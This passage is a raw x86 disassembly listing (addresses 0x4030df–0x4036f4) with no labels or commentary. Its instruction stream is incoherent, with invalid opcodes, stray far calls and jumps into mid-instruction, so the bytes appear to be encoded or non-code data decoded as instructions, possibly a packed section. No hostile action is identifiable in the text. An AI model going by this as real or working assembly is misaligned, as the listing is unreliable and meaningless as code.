  4030df:	5f                   	pop    %edi
  4030e0:	2b 30                	sub    (%eax),%esi
  4030e2:	2b 23                	sub    (%ebx),%esp
  4030e4:	88 bc a0 60 a0 bb 63 	mov    %bh,0x63bba060(%eax,%eiz,4)
  4030eb:	eb 60                	jmp    0x40314d
  4030ed:	b3 2b                	mov    $0x2b,%bl
  4030ef:	38 2b                	cmp    %ch,(%ebx)
  4030f1:	23 88 06 a0 60 a0    	and    -0x5f9f5ffa(%eax),%ecx
  4030f7:	eb 63                	jmp    0x40315c
  4030f9:	48                   	dec    %eax
  4030fa:	03 55 9f             	add    -0x61(%ebp),%edx
  4030fd:	5f                   	pop    %edi
  4030fe:	fb                   	sti
  4030ff:	23 30                	and    (%eax),%esi
  403101:	e3 60                	jecxz  0x403163
  403103:	38 2b                	cmp    %ch,(%ebx)
  403105:	60                   	pusha
  403106:	63 eb                	arpl   %ebp,%ebx
  403108:	60                   	pusha
  403109:	e4 72                	in     $0x72,%al
  40310b:	d4 a8                	aam    $0xa8
  40310d:	e3 64                	jecxz  0x403173
  40310f:	50                   	push   %eax
  403110:	88 74 a1 60          	mov    %dh,0x60(%ecx,%eiz,4)
  403114:	a0 e4 72 d4 af       	mov    0xafd472e4,%al
  403119:	48                   	dec    %eax
  40311a:	03 61 a0             	add    -0x60(%ecx),%esp
  40311d:	60                   	pusha
  40311e:	04 ef                	add    $0xef,%al
  403120:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403121:	60                   	pusha
  403122:	a0 60 a0 e3 64       	mov    0x64e3a060,%al
  403127:	6c                   	insb   (%dx),%es:(%edi)
  403128:	63 48 03             	arpl   %ecx,0x3(%eax)
  40312b:	61                   	popa
  40312c:	a0 60 24 32 1e       	mov    0x1e322460,%al
  403131:	65 88 a2 a1 60 a0 23 	mov    %ah,%gs:0x23a060a1(%edx)
  403138:	30 e5                	xor    %ah,%ch
  40313a:	60                   	pusha
  40313b:	d4 a7                	aam    $0xa7
  40313d:	12 a1 eb a8 5f f1    	adc    -0xea05715(%ecx),%ah
  403143:	5c                   	pop    %esp
  403144:	63 b3 f6 b7 29 23    	arpl   %esi,0x2329b7f6(%ebx)
  40314a:	29 37                	sub    %esi,(%edi)
  40314c:	4b                   	dec    %ebx
  40314d:	eb eb                	jmp    0x40313a
  40314f:	38 d1                	cmp    %dl,%cl
  403151:	20 f1                	and    %dh,%cl
  403153:	21 89 62 e9 53 4b    	and    %ecx,0x4b53e962(%ecx)
  403159:	b9 23 41 a3 53       	mov    $0x53a34123,%ecx
  40315e:	4a                   	dec    %edx
  40315f:	e9 70 e9 82 eb       	jmp    0xebc31ad4
  403164:	eb 18                	jmp    0x40317e
  403166:	25 29 14 61 f1       	and    $0xf1611429,%eax
  40316b:	eb fb                	jmp    0x403168
  40316d:	3c 25                	cmp    $0x25,%al
  40316f:	3b 14 64             	cmp    (%esp,%eiz,2),%edx
  403172:	2b 7b 8b             	sub    -0x75(%ebx),%edi
  403175:	4d                   	dec    %ebp
  403176:	d9 34 14             	fnstenv (%esp,%edx,1)
  403179:	7d fb                	jge    0x403176
  40317b:	eb ab                	jmp    0x403128
  40317d:	e3 63                	jecxz  0x4031e2
  40317f:	64 2b d3             	fs sub %ebx,%edx
  403182:	b0 e5                	mov    $0xe5,%al
  403184:	96                   	xchg   %eax,%esi
  403185:	d4 a6                	aam    $0xa6
  403187:	eb 1b                	jmp    0x4031a4
  403189:	74 29                	je     0x4031b4
  40318b:	94                   	xchg   %eax,%esp
  40318c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40318d:	e3 63                	jecxz  0x4031f2
  40318f:	7c e9                	jl     0x40317a
  403191:	d5 8d                	aad    $0x8d
  403193:	99                   	cltd
  403194:	74 d5                	je     0x40316b
  403196:	83 bf fe bb 63 eb 60 	cmpl   $0x60,-0x149c4402(%edi)
  40319d:	b3 f6                	mov    $0xf6,%bl
  40319f:	e9 63 e9 66 eb       	jmp    0xeba71b07
  4031a4:	d6                   	salc
  4031a5:	eb f6                	jmp    0x40319d
  4031a7:	20 2b                	and    %ch,(%ebx)
  4031a9:	d6                   	salc
  4031aa:	7c e5                	jl     0x403191
  4031ac:	72 d4                	jb     0x403182
  4031ae:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4031af:	48                   	dec    %eax
  4031b0:	75 6d                	jne    0x40321f
  4031b2:	a0 60 29 38 25       	mov    0x25382960,%al
  4031b7:	56                   	push   %esi
  4031b8:	15 49 fe bb 63       	adc    $0x63bbfe49,%eax
  4031bd:	b7 36                	mov    $0x36,%bh
  4031bf:	4b                   	dec    %ebx
  4031c0:	a2 eb d6 eb 1e       	mov    %al,0x1eebd6eb
  4031c5:	30 25 5f 14 6d af    	xor    %ah,0xaf6d145f
  4031cb:	17                   	pop    %ss
  4031cc:	af                   	scas   %es:(%edi),%eax
  4031cd:	b1 23                	mov    $0x23,%cl
  4031cf:	27                   	daa
  4031d0:	a2 52 06 0f 14       	mov    %al,0x140f0652
  4031d5:	6a f9                	push   $0xfffffff9
  4031d7:	eb 16                	jmp    0x4031ef
  4031d9:	3c 25                	cmp    $0x25,%al
  4031db:	56                   	push   %esi
  4031dc:	15 43 ff 23 f8       	adc    $0xf823ff43,%eax
  4031e1:	61                   	popa
  4031e2:	60                   	pusha
  4031e3:	89 68 eb             	mov    %ebp,-0x15(%eax)
  4031e6:	14 a7                	adc    $0xa7,%al
  4031e8:	9c                   	pushf
  4031e9:	bf 63 eb 60 18       	mov    $0x1860eb63,%edi
  4031ee:	9f                   	lahf
  4031ef:	5f                   	pop    %edi
  4031f0:	a0 e0 63 eb 60       	mov    0x60eb63e0,%al
  4031f5:	23 2d a0 a0 23 2d    	and    0x2d23a0a0,%ebp
  4031fb:	a0 a0 23 2d a0       	mov    0xa02d23a0,%al
  403200:	a0 b6 06 eb d2       	mov    0xd2eb06b6,%al
  403205:	c6                   	(bad)
  403206:	a9 56 14 77 06       	test   $0x6771456,%eax
  40320b:	e1 9e                	loope  0x4031ab
  40320d:	60                   	pusha
  40320e:	60                   	pusha
  40320f:	d3 b0 b0 2b 60 88    	shll   %cl,-0x779fd450(%eax)
  403215:	04 9f                	add    $0x9f,%al
  403217:	5f                   	pop    %edi
  403218:	9f                   	lahf
  403219:	b8 14 65 29 51       	mov    $0x51296514,%eax
  40321e:	fe                   	(bad)
  40321f:	5f                   	pop    %edi
  403220:	81 be 2b 68 9f c1 90 	cmpl   $0xb2302390,-0x3e6097d5(%esi)
  403227:	23 30 b2 
  40322a:	f1                   	int1
  40322b:	b3 24                	mov    $0x24,%bl
  40322d:	32 1c 63             	xor    (%ebx,%eiz,2),%bl
  403230:	9f                   	lahf
  403231:	b0 94                	mov    $0x94,%al
  403233:	91                   	xchg   %eax,%ecx
  403234:	72 ed                	jb     0x403223
  403236:	ec                   	in     (%dx),%al
  403237:	84 b0 c4 2b 7a 29    	test   %dh,0x297a2bc4(%eax)
  40323d:	79 29                	jns    0x403268
  40323f:	c9                   	leave
  403240:	a8 27                	test   $0x27,%al
  403242:	e1 64                	loope  0x4032a8
  403244:	69 7d e0 60 29 a1 ac 	imul   $0xaca12960,-0x20(%ebp),%edi
  40324b:	c4 29                	les    (%ecx),%ebp
  40324d:	6a fb                	push   $0xfffffffb
  40324f:	b9 fa 23 89 9a       	mov    $0x9a8923fa,%ecx
  403254:	a1 60 a0 eb e4       	mov    0xe4eba060,%eax
  403259:	84 cc                	test   %cl,%ah
  40325b:	eb e0                	jmp    0x40323d
  40325d:	6c                   	insb   (%dx),%es:(%edi)
  40325e:	25 20 14 6e 2b       	and    $0x2b6e1420,%eax
  403263:	68 52 e1 f0 5f       	push   $0x5ff0e152
  403268:	f1                   	int1
  403269:	5c                   	pop    %esp
  40326a:	f8                   	clc
  40326b:	48                   	dec    %eax
  40326c:	a9 60 a0 60 88       	test   $0x8860a060,%eax
  403271:	e0 a2                	loopne 0x403215
  403273:	60                   	pusha
  403274:	a0 23 2d a0 a0       	mov    0xa0a02d23,%al
  403279:	eb b0                	jmp    0x40322b
  40327b:	5f                   	pop    %edi
  40327c:	f2 58                	repnz pop %eax
  40327e:	63 eb                	arpl   %ebp,%ebx
  403280:	60                   	pusha
  403281:	b3 2b                	mov    $0x2b,%bl
  403283:	38 2b                	cmp    %ch,(%ebx)
  403285:	23 2b                	and    (%ebx),%ebp
  403287:	70 9f                	jo     0x403228
  403289:	b2 84                	mov    $0x84,%dl
  40328b:	eb 63                	jmp    0x4032f0
  40328d:	bb 63 eb 60 e4       	mov    $0xe460eb63,%ebx
  403292:	72 df                	jb     0x403273
  403294:	a1 23 f0 b2 2b       	mov    0x2bb2f023,%eax
  403299:	70 9f                	jo     0x40323a
  40329b:	b2 88                	mov    $0x88,%dl
  40329d:	ba f8 23 30 e0       	mov    $0xe03023f8,%edx
  4032a2:	dd 74 40 a0          	fnsave -0x60(%eax,%eax,2)
  4032a6:	a0 61 16 71 0a       	mov    0xa711661,%al
  4032ab:	60                   	pusha
  4032ac:	0a 60 0a             	or     0xa(%eax),%ah
  4032af:	60                   	pusha
  4032b0:	08 3f                	or     %bh,(%edi)
  4032b2:	9a 4d ae 5f b5 70 50 	lcall  $0x5070,$0xb55fae4d
  4032b9:	a0 a0 23 30 e0       	mov    0xe03023a0,%al
  4032be:	dd 74 40 a0          	fnsave -0x60(%eax,%eax,2)
  4032c2:	a0 60 14 77 f0       	mov    0xf0771460,%al
  4032c7:	b0 f2                	mov    $0xf2,%al
  4032c9:	b4 0a                	mov    $0xa,%ah
  4032cb:	62 0a                	bound  %ecx,(%edx)
  4032cd:	60                   	pusha
  4032ce:	08 44 9a 4d          	or     %al,0x4d(%edx,%ebx,4)
  4032d2:	ae                   	scas   %es:(%edi),%al
  4032d3:	5f                   	pop    %edi
  4032d4:	b5 70                	mov    $0x70,%ch
  4032d6:	50                   	push   %eax
  4032d7:	a0 a0 e3 64 68       	mov    0x6864e3a0,%al
  4032dc:	f8                   	clc
  4032dd:	23 2d a0 a0 b4 0a    	and    0xab4a0a0,%ebp
  4032e3:	61                   	popa
  4032e4:	0a 60 08             	or     0x8(%eax),%ah
  4032e7:	40                   	inc    %eax
  4032e8:	9a 4d ae 5f b5 70 50 	lcall  $0x5070,$0xb55fae4d
  4032ef:	a0 a0 e3 64 64       	mov    0x6464e3a0,%al
  4032f4:	f8                   	clc
  4032f5:	23 2d a0 a0 e0 dd    	and    0xdde0a0a0,%ebp
  4032fb:	74 40                	je     0x40333d
  4032fd:	a0 a0 61 16 67       	mov    0x671661a0,%al
  403302:	f0 b3 89             	lock mov $0x89,%bl
  403305:	38 9f 5f 9f 23 2d    	cmp    %bl,0x2d239f5f(%edi)
  40330b:	a0 a0 e5 69 d4       	mov    0xd469e5a0,%al
  403310:	b9 eb e1 61 20       	mov    $0x2061e1eb,%ecx
  403315:	99                   	cltd
  403316:	89 d4                	mov    %edx,%esp
  403318:	ac                   	lods   %ds:(%esi),%al
  403319:	e0 d9                	loopne 0x4032f4
  40331b:	4b                   	dec    %ebx
  40331c:	15 6c af 1e 60       	adc    $0x601eaf6c,%eax
  403321:	a1 e1 4b a3 e3       	mov    0xe3a34be1,%eax
  403326:	61                   	popa
  403327:	65 a1 21 63 eb 60    	mov    %gs:0x60eb6321,%eax
  40332d:	e0 dd                	loopne 0x40330c
  40332f:	74 40                	je     0x403371
  403331:	a0 a0 61 16 7d       	mov    0x7d1661a0,%al
  403336:	f0 b2 f1             	lock mov $0xf1,%dl
  403339:	48                   	dec    %eax
  40333a:	6f                   	outsl  %ds:(%esi),(%dx)
  40333b:	5f                   	pop    %edi
  40333c:	9f                   	lahf
  40333d:	5f                   	pop    %edi
  40333e:	f1                   	int1
  40333f:	b4 0a                	mov    $0xa,%ah
  403341:	61                   	popa
  403342:	0a 60 08             	or     0x8(%eax),%ah
  403345:	41                   	inc    %ecx
  403346:	9a 4d ae 5f b5 70 50 	lcall  $0x5070,$0xb55fae4d
  40334d:	a0 a0 b9 f9 ba       	mov    0xbaf9b9a0,%al
  403352:	f8                   	clc
  403353:	23 30                	and    (%eax),%esi
  403355:	e0 dd                	loopne 0x403334
  403357:	74 40                	je     0x403399
  403359:	a0 a0 61 16 72       	mov    0x721661a0,%al
  40335e:	f2 b4 0a             	repnz mov $0xa,%ah
  403361:	61                   	popa
  403362:	0a 60 08             	or     0x8(%eax),%ah
  403365:	42                   	inc    %edx
  403366:	9a 4d ae 5f b5 70 50 	lcall  $0x5070,$0xb55fae4d
  40336d:	a0 a0 ba 63 b0       	mov    0xb063baa0,%al
  403372:	f2 e0 dd             	repnz loopne 0x403352
  403375:	74 40                	je     0x4033b7
  403377:	a0 a0 61 16 70       	mov    0x701661a0,%al
  40337c:	f4                   	hlt
  40337d:	ca a2 ca             	lret   $0xcaa2
  403380:	a0 c8 83 5a 8d       	mov    0x8d5a83c8,%al
  403385:	6e                   	outsb  %ds:(%esi),(%dx)
  403386:	9f                   	lahf
  403387:	75 b0                	jne    0x403339
  403389:	10 e0                	adc    %ah,%al
  40338b:	60                   	pusha
  40338c:	fa                   	cli
  40338d:	b8 63 eb 60 eb       	mov    $0xeb60eb63,%eax
  403392:	e4 84                	in     $0x84,%al
  403394:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403395:	57                   	push   %edi
  403396:	e0 64                	loopne 0x4033fc
  403398:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403399:	60                   	pusha
  40339a:	a0 60 af e5 b3       	mov    0xb3e5af60,%al
  40339f:	61                   	popa
  4033a0:	a0 60 21 98 7e       	mov    0x7e982160,%al
  4033a5:	5a                   	pop    %edx
  4033a6:	8d 6e 2b             	lea    0x2b(%esi),%ebp
  4033a9:	b0 b8                	mov    $0xb8,%al
  4033ab:	eb e8                	jmp    0x403395
  4033ad:	74 14                	je     0x4033c3
  4033af:	ce                   	into
  4033b0:	9c                   	pushf
  4033b1:	48                   	dec    %eax
  4033b2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4033b3:	5d                   	pop    %ebp
  4033b4:	9f                   	lahf
  4033b5:	5f                   	pop    %edi
  4033b6:	2b 75 ac             	sub    -0x54(%ebp),%esi
  4033b9:	10 e0                	adc    %ah,%al
  4033bb:	60                   	pusha
  4033bc:	25 32 af e4 91       	and    $0x91e4af32,%eax
  4033c1:	60                   	pusha
  4033c2:	a0 60 9f 32 25       	mov    0x25329f60,%al
  4033c7:	20 af e4 87 60 a0    	and    %ch,-0x5f9f781c(%edi)
  4033cd:	60                   	pusha
  4033ce:	2b b4 c4 6c 2b ac c4 	sub    -0x3b53d494(%esp,%eax,8),%esi
  4033d5:	64 21 99 6e 5a 8f 6e 	and    %ebx,%fs:0x6e8f5a6e(%ecx)
  4033dc:	14 97                	adc    $0x97,%al
  4033de:	88 3a                	mov    %bh,(%edx)
  4033e0:	9e                   	sahf
  4033e1:	5f                   	pop    %edi
  4033e2:	9f                   	lahf
  4033e3:	e0 dd                	loopne 0x4033c2
  4033e5:	78 40                	js     0x403427
  4033e7:	a0 a0 60 16 89       	mov    0x891660a0,%al
  4033ec:	20 9d b4 00 e0 60    	and    %bl,0x60e000b4(%ebp)
  4033f2:	a0 d7 c0 ed ec       	mov    0xecedc0d7,%al
  4033f7:	84 a4 b0 f1 48 49 51 	test   %ah,0x514948f1(%eax,%esi,4)
  4033fe:	9f                   	lahf
  4033ff:	5f                   	pop    %edi
  403400:	23 58 a0             	and    -0x60(%eax),%ebx
  403403:	b8 af e4 4b 60       	mov    $0x604be4af,%eax
  403408:	a0 60 29 22 2b       	mov    0x2b222960,%al
  40340d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40340e:	c4 64 2b a8          	les    -0x58(%ebx,%ebp,1),%esp
  403412:	ac                   	lods   %ds:(%esi),%al
  403413:	4b                   	dec    %ebx
  403414:	d0 e9                	shr    $1,%cl
  403416:	62 eb e4             	(bad) {%k4}{z}
  403419:	84 a4 eb e8 6c 20 9d 	test   %ah,-0x62df9318(%ebx,%ebp,8)
  403420:	b8 00 e0 60 a1       	mov    $0xa160e000,%eax
  403425:	d6                   	salc
  403426:	be e0 dd 74 40       	mov    $0x4074dde0,%esi
  40342b:	a0 a0 60 17 75       	mov    0x751760a0,%al
  403430:	f0 ed                	lock in (%dx),%eax
  403432:	e4 84                	in     $0x84,%al
  403434:	a8 b2                	test   $0xb2,%al
  403436:	f1                   	int1
  403437:	b0 88                	mov    $0x88,%al
  403439:	cc                   	int3
  40343a:	91                   	xchg   %eax,%ecx
  40343b:	5f                   	pop    %edi
  40343c:	9f                   	lahf
  40343d:	e3 98                	jecxz  0x4033d7
  40343f:	60                   	pusha
  403440:	f9                   	stc
  403441:	ba f8 d4 10 e3       	mov    $0xe310d4f8,%edx
  403446:	e8 64 a2 b3 d1       	call   0xd1f3d6af
  40344b:	3b f6                	cmp    %esi,%esi
  40344d:	b7 f5                	mov    $0xf5,%bh
  40344f:	c4 2b                	les    (%ebx),%ebp
  403451:	7b f3                	jnp    0x403446
  403453:	b0 f2                	mov    $0xf2,%al
  403455:	b1 2b                	mov    $0x2b,%cl
  403457:	b4 c4                	mov    $0xc4,%ah
  403459:	88 0a                	mov    %cl,(%edx)
  40345b:	60                   	pusha
  40345c:	f0 c8 80 7f e0       	lock enter $0x7f80,$0xe0
  403461:	60                   	pusha
  403462:	f2 5f                	repnz pop %edi
  403464:	b5 74                	mov    $0x74,%ch
  403466:	50                   	push   %eax
  403467:	a0 a0 eb 1c 84       	mov    0x841ceba0,%al
  40346c:	c8 48 77 72          	enter  $0x7748,$0x72
  403470:	a0 60 9f 10 a0       	mov    0xa0109f60,%al
  403475:	60                   	pusha
  403476:	a0 60 29 00 a0       	mov    0xa0002960,%al
  40347b:	60                   	pusha
  40347c:	a0 60 2b cf a8       	mov    0xa8cf2b60,%al
  403481:	eb ff                	jmp    0x403482
  403483:	64 67 a7             	cmpsl  %es:(%di),%fs:(%si)
  403486:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403487:	6c                   	insb   (%dx),%es:(%edi)
  403488:	c0 a0 a0 e3 63 65 88 	shlb   $0x88,0x6563e3a0(%eax)
  40348f:	c6                   	(bad)
  403490:	9e                   	sahf
  403491:	5f                   	pop    %edi
  403492:	9f                   	lahf
  403493:	5f                   	pop    %edi
  403494:	83 49 c3 60          	orl    $0x60,-0x3d(%ecx)
  403498:	a0 60 88 0a b2       	mov    0xb20a8860,%al
  40349d:	60                   	pusha
  40349e:	a0 eb 28 60 a0       	mov    0xa06028eb,%al
  4034a3:	60                   	pusha
  4034a4:	a0 eb b1 e9 30       	mov    0x30e9b1eb,%al
  4034a9:	60                   	pusha
  4034aa:	a0 60 a0 eb e1       	mov    0xe1eba060,%al
  4034af:	68 89 e4 9c 5f       	push   $0x5f9ce489
  4034b4:	9f                   	lahf
  4034b5:	18 a1 60 a0 60 63    	sbb    %ah,0x6360a060(%ecx)
  4034bb:	eb 60                	jmp    0x40351d
  4034bd:	eb e4                	jmp    0x4034a3
  4034bf:	84 a4 eb f4 84 a8 57 	test   %ah,0x57a884f4(%ebx,%ebp,8)
  4034c6:	e0 64                	loopne 0x40352c
  4034c8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4034c9:	60                   	pusha
  4034ca:	a0 60 14 7f 2b       	mov    0x2b7f1460,%al
  4034cf:	aa                   	stos   %al,%es:(%edi)
  4034d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4034d1:	27                   	daa
  4034d2:	e2 64                	loop   0x403538
  4034d4:	04 80                	add    $0x80,%al
  4034d6:	e0 60                	loopne 0x403538
  4034d8:	f3 b6 f7             	repz mov $0xf7,%dh
  4034db:	b5 2b                	mov    $0x2b,%ch
  4034dd:	ca a8 e3             	lret   $0xe3a8
  4034e0:	61                   	popa
  4034e1:	65 88 a6 9e 5f 9f 5f 	mov    %ah,%gs:0x5f9f5f9e(%esi)
  4034e8:	71 bd                	jno    0x4034a7
  4034ea:	ff                   	(bad)
  4034eb:	be fb 18 a1 60       	mov    $0x60a118fb,%esi
  4034f0:	a0 60 63 eb 60       	mov    0x60eb6360,%al
  4034f5:	eb e4                	jmp    0x4034db
  4034f7:	84 d0                	test   %dl,%al
  4034f9:	27                   	daa
  4034fa:	e0 64                	loopne 0x403560
  4034fc:	57                   	push   %edi
  4034fd:	80 e0 60             	and    $0x60,%al
  403500:	88 a4 b2 60 a0 eb 30 	mov    %ah,0x30eba060(%edx,%esi,4)
  403507:	60                   	pusha
  403508:	a0 60 a0 eb aa       	mov    0xaaeba060,%al
  40350d:	e9 28 60 a0 60       	jmp    0x60e0953a
  403512:	a0 eb e2 6c 23       	mov    0x236ce2eb,%al
  403517:	c0 a4 5d 21 98 7e 5a 	shlb   $0x8d,0x5a7e9821(%ebp,%ebx,2)
  40351e:	8d 
  40351f:	6e                   	outsb  %ds:(%esi),(%dx)
  403520:	14 6d                	adc    $0x6d,%al
  403522:	2b a2 a8 48 af 5c    	sub    0x5caf48a8(%edx),%esp
  403528:	9f                   	lahf
  403529:	5f                   	pop    %edi
  40352a:	88 d2                	mov    %dl,%dl
  40352c:	9d                   	popf
  40352d:	5f                   	pop    %edi
  40352e:	9f                   	lahf
  40352f:	91                   	xchg   %eax,%ecx
  403530:	60                   	pusha
  403531:	e3 64                	jecxz  0x403597
  403533:	74 04                	je     0x403539
  403535:	eb b0                	jmp    0x4034e7
  403537:	b9 2b 72 29 71       	mov    $0x7129722b,%ecx
  40353c:	fd                   	std
  40353d:	bf fe bb 58 61       	mov    $0x6158bbfe,%edi
  403542:	a0 60 a0 23 2d       	mov    0x2d23a060,%al
  403547:	a0 a0 48 9b 71       	mov    0x719b48a0,%al
  40354c:	a0 60 2b f0 a0       	mov    0xa0f02b60,%al
  403551:	60                   	pusha
  403552:	a0 60 2b 6a 29       	mov    0x296a2b60,%al
  403557:	e8 a0 60 a0 60       	call   0x60e095fc
  40355c:	2b a2 a8 48 75 5b    	sub    0x5b7548a8(%edx),%esp
  403562:	9f                   	lahf
  403563:	5f                   	pop    %edi
  403564:	fa                   	cli
  403565:	eb 04                	jmp    0x40356b
  403567:	84 cc                	test   %cl,%ah
  403569:	91                   	xchg   %eax,%ecx
  40356a:	60                   	pusha
  40356b:	b9 04 e9 a8 b8       	mov    $0xb8a8e904,%ecx
  403570:	fd                   	std
  403571:	48                   	dec    %eax
  403572:	7f 5d                	jg     0x4035d1
  403574:	9f                   	lahf
  403575:	5f                   	pop    %edi
  403576:	9f                   	lahf
  403577:	42                   	inc    %edx
  403578:	63 91 72 eb ec 84    	arpl   %edx,-0x7b13148e(%ecx)
  40357e:	a8 eb                	test   $0xeb,%al
  403580:	e4 84                	in     $0x84,%al
  403582:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403583:	e3 61                	jecxz  0x4035e6
  403585:	65 04 e9             	gs add $0xe9,%al
  403588:	a2 5f 71 22 ac       	mov    %al,0xac22715f
  40358d:	60                   	pusha
  40358e:	63 eb                	arpl   %ebp,%ebx
  403590:	60                   	pusha
  403591:	b5 2b                	mov    $0x2b,%ch
  403593:	4c                   	dec    %esp
  403594:	2b b5 a8 eb a2 9d    	sub    -0x625d1458(%ebp),%esi
  40359a:	32 60 a0             	xor    -0x60(%eax),%ah
  40359d:	20 1f                	and    %bl,(%edi)
  40359f:	8c 14 bc             	mov    %ss,(%esp,%edi,4)
  4035a2:	dd ee                	fucomp %st(6)
  4035a4:	a0 60 60 df b5       	mov    0xb5df6060,%al
  4035a9:	d4 f7                	aam    $0xf7
  4035ab:	8d a5 60 a0 20 14    	lea    0x1420a060(%ebp),%esp
  4035b1:	bc cd e7 a0 60       	mov    $0x60a0e7cd,%esp
  4035b6:	a0 d4 dd a8 14       	mov    0x14a8ddd4,%al
  4035bb:	ae                   	scas   %es:(%edi),%al
  4035bc:	8b c0                	mov    %eax,%eax
  4035be:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4035bf:	d1 9f 5f df e3 88    	rcrl   $1,-0x771c20a1(%edi)
  4035c5:	62 12                	bound  %edx,(%edx)
  4035c7:	96                   	xchg   %eax,%esi
  4035c8:	14 90                	adc    $0x90,%al
  4035ca:	8b b2 dd f6 a0 60    	mov    0x60a0f6dd(%edx),%esi
  4035d0:	60                   	pusha
  4035d1:	df b1 d4 dd 8d 33    	fbstp  0x338dddd4(%ecx)
  4035d7:	60                   	pusha
  4035d8:	a0 20 14 8e e8       	mov    0xe88e1420,%al
  4035dd:	d4 b3                	aam    $0xb3
  4035df:	a8 14                	test   $0x14,%al
  4035e1:	84 8b 9a cd 5d a0    	test   %cl,-0x5fa23266(%ebx)
  4035e7:	60                   	pusha
  4035e8:	60                   	pusha
  4035e9:	d4 cf                	aam    $0xcf
  4035eb:	e3 88                	jecxz  0x403575
  4035ed:	9d                   	popf
  4035ee:	14 86                	adc    $0x86,%al
  4035f0:	8b 8c 50 28 8b 8a 50 	mov    0x508a8b28(%eax,%edx,2),%ecx
  4035f7:	29 8b 86 50 2d 8b    	sub    %ecx,-0x74d2af7a(%ebx)
  4035fd:	82 50 2f 8b          	adcb   $0x8b,0x2f(%eax)
  403601:	7e 50                	jle    0x403653
  403603:	28 8b 7a 50 37 8b    	sub    %cl,-0x74c8af86(%ebx)
  403609:	76 50                	jbe    0x40365b
  40360b:	2e 8b 72 50          	mov    %cs:0x50(%edx),%esi
  40360f:	38 8b 6e 50 3a 8b    	cmp    %cl,-0x74c5af92(%ebx)
  403615:	6a 50                	push   $0x50
  403617:	39 8b 66 50 2a 8b    	cmp    %ecx,-0x74d5af9a(%ebx)
  40361d:	62 50 5f             	bound  %edx,0x5f(%eax)
  403620:	c5 5f a0             	lds    -0x60(%edi),%ebx
  403623:	60                   	pusha
  403624:	a0 eb f2 6c 88       	mov    0x886cf2eb,%al
  403629:	fc                   	cld
  40362a:	90                   	nop
  40362b:	5f                   	pop    %edi
  40362c:	9f                   	lahf
  40362d:	bd 62 64 a0 eb       	mov    $0xeba06462,%ebp
  403632:	e4 84                	in     $0x84,%al
  403634:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403635:	57                   	push   %edi
  403636:	e0 64                	loopne 0x40369c
  403638:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403639:	60                   	pusha
  40363a:	a0 60 af e5 29       	mov    0x29e5af60,%al
  40363f:	60                   	pusha
  403640:	a0 60 20 9d b4       	mov    0xb49d2060,%al
  403645:	00 e0                	add    %ah,%al
  403647:	60                   	pusha
  403648:	a0 d7 af ed e4       	mov    0xe4edafd7,%al
  40364d:	84 a4 b0 88 b4 8f 5f 	test   %ah,0x5f8fb488(%eax,%esi,4)
  403654:	9f                   	lahf
  403655:	e3 98                	jecxz  0x4035ef
  403657:	60                   	pusha
  403658:	14 d1                	adc    $0xd1,%al
  40365a:	2b a4 c4 64 9c 48 f9 	sub    -0x6b7639c(%esp,%eax,8),%esp
  403661:	5a                   	pop    %edx
  403662:	9f                   	lahf
  403663:	5f                   	pop    %edi
  403664:	2b b4 c4 68 0a 60 f0 	sub    -0xf9ff598(%esp,%eax,8),%esi
  40366b:	c8 8e 81 e0          	enter  $0x818e,$0xe0
  40366f:	60                   	pusha
  403670:	f2 5f                	repnz pop %edi
  403672:	b5 74                	mov    $0x74,%ch
  403674:	50                   	push   %eax
  403675:	a0 a0 eb fc 84       	mov    0x84fceba0,%al
  40367a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40367b:	e1 db                	loope  0x403658
  40367d:	3e 9a 4d ae eb f3 74 	ds lcall $0x2b74,$0xf3ebae4d
  403684:	2b 
  403685:	a3 b8 d4 bd eb       	mov    %eax,0xebbdd4b8
  40368a:	b5 6c                	mov    $0x6c,%ch
  40368c:	50                   	push   %eax
  40368d:	a0 a0 e5 72 6f       	mov    0x6f72e5a0,%al
  403692:	24 5a                	and    $0x5a,%al
  403694:	9e                   	sahf
  403695:	5f                   	pop    %edi
  403696:	9f                   	lahf
  403697:	e9 78 5f 72 e5       	jmp    0xe5b29614
  40369c:	60                   	pusha
  40369d:	6f                   	outsl  %ds:(%esi),(%dx)
  40369e:	24 4e                	and    $0x4e,%al
  4036a0:	9e                   	sahf
  4036a1:	5f                   	pop    %edi
  4036a2:	9f                   	lahf
  4036a3:	eb f3                	jmp    0x403698
  4036a5:	6c                   	insb   (%dx),%es:(%edi)
  4036a6:	88 26                	mov    %ah,(%esi)
  4036a8:	9c                   	pushf
  4036a9:	5f                   	pop    %edi
  4036aa:	9f                   	lahf
  4036ab:	eb ad                	jmp    0x40365a
  4036ad:	64 50                	fs push %eax
  4036af:	a0 a0 e5 69 d4       	mov    0xd469e5a0,%al
  4036b4:	a2 5f 71 eb ec       	mov    %al,0xeceb715f
  4036b9:	84 a4 18 79 60 a0 60 	test   %ah,0x60a06079(%eax,%ebx,1)
  4036c0:	2b b1 b4 e9 b4 84    	sub    -0x7b4b164c(%ecx),%esi
  4036c6:	89 02                	mov    %eax,(%edx)
  4036c8:	a2 60 a0 91 60       	mov    %al,0x6091a060
  4036cd:	23 2d a0 a0 91 72    	and    0x7291a0a0,%ebp
  4036d3:	b5 2d                	mov    $0x2d,%ch
  4036d5:	cc                   	int3
  4036d6:	c4 b0 2d a5 94 c4    	les    -0x3b6b5ad3(%eax),%esi
  4036dc:	2b 6a 04             	sub    0x4(%edx),%ebp
  4036df:	e9 a2 e9 a8 27       	jmp    0x27e92086
  4036e4:	e0 64                	loopne 0x40374a
  4036e6:	48                   	dec    %eax
  4036e7:	81 e0 60 29 c8 a8    	and    $0xa8c82960,%eax
  4036ed:	03 3c 15 e0 60 fd 23 	add    0x23fd60e0(,%edx,1),%edi
  4036f4:	30 b3 f6 b7 f5 1f    	xor    %dh,0x1ff5b7f6(%ebx)
